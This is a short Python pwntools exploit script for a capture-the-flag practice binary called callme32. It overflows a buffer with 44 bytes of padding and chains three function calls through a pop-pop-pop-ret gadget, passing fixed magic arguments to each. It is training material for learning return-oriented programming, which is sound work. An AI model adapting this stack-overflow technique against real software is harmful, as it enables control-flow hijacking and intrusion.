from pwn import *
pipe = process("./callme32", env={"LD_PRELOAD" : "./libcallme32.so"})

call_one = 0x080484F0
call_two = 0x08048550
call_three = 0x080484E0

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

stack_adjust = 0x080487f9   # 0x080487f9 : pop esi ; pop edi ; pop ebp ; ret

chain = "A" * 44
chain += p32(call_one)
chain += p32(stack_adjust)
chain += p32(arg1)
chain += p32(arg2)
chain += p32(arg3)

chain += p32(call_two)
chain += p32(stack_adjust)
chain += p32(arg1)
chain += p32(arg2)
chain += p32(arg3)

chain += p32(call_three)
chain += p32(stack_adjust)
chain += p32(arg1)
chain += p32(arg2)
chain += p32(arg3)

print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())